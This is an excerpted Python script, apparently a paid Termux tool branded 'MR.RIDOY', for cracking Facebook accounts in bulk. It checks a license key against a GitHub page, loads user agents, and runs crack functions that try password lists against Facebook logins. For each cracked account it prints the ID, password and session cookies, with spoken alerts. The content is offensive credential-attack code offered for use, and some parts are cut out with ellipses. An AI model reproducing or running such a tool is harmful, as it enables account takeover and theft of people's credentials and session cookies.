...
os.system(f'xdg-open https://www.facebook.com/XcwRidoy')
...
prinCP=[]
try:
    prox= requests.get('https://github.com/AKASH-XD2/Rx/blob/main/Rx').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/AKASH-XD2/Rx/blob/main/Rx').text
        ua=open('bbnew.txt','w')
...
logo ="""
\033[0;92m╔═════════════════════════════════════════════════════════╗
\033[0;92m║  \033[1;33m ██████╗\033[1;31m  ██╗\033[1;33m ██████╗\033[1;31m   ██████╗ \033[1;33m ██╗   ██╗             \033[0;92m║
\033[0;92m║  \033[1;33m ██╔══██╗\033[1;31m ██║\033[1;33m ██╔══██╗\033[1;31m ██╔═══██╗ \033[1;33m╚██╗ ██╔╝             \033[0;92m║
\033[0;92m║  \033[1;33m ██████╔╝\033[1;31m ██║\033[1;33m ██║  ██║\033[1;31m ██║   ██║ \033[1;33m ╚████╔╝              \033[0;92m║
\033[0;92m║  \033[1;33m ██╔══██╗\033[1;31m ██║\033[1;33m ██║  ██║\033[1;31m ██║   ██║ \033[1;33m  ╚██╔╝               \033[0;92m║
\033[0;92m║  \033[1;33m ██║  ██║\033[1;31m ██║\033[1;33m ██████╔╝\033[1;31m ╚██████╔╝\033[1;33m    ██║                \033[0;92m║
...
[] FACEBOOK     :      𝙍𝙄𝘿𝙊𝙔
[] VERSION      :      6.1
[] MESSENGER    :      𝙍𝙄𝘿𝙊𝙔 𝗧𝗲𝗿𝗺𝘂𝘅 𝗖𝗼𝗺𝗺𝘂𝗻𝗶𝘁𝘆
=================================================="\033[1;23m"""                                
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/AKASH-XD2/Rx/blob/main/Rx').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      ...
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   MR,   RIDOY,    Please,   Send,   Your,   Key,"')
...
os.system('espeak -a 300 " Welcome,   to,  MR.RIDOY,  PAID,   Tools"')
def back():
	login()
...
def menu():
    ...
    print('\033[0;97m===============================================')
    print(f"""\033[91;1m[\033[92;1m1\033[91;1m] \033[0;91mFILE CLONING          """)
    print("""\033[95;1m[\033[95;1m2\033[95;1m] \033[0;95mCONTACT WIH ADMIN""")
    print(f"""\033[93;1m[\033[93;1m3\033[93;1m] \033[93;1mCHECK K ID   """)
    print("""\033[98;1m[\033[98;1m0\033[98;1m] \033[0;98mEXIT""")
    print('\033[0;97m=================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;95m{bo}[RIDOY 🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}\033[0;97m•\033[0;93mPAPEL-CP] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " PAPEL,  Cp,  Id"')
                ...
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}\033[0;97m•\033[0; 95mPAPEL-OK💚] {idf} \033[0;97m• \033[0;95m{pw}\n\033[0;91m[🌺]= COOKIES • \033[0;91m{kuki} ')
                os.system('espeak -a 300 " PAPEL,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[PAPEL•M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
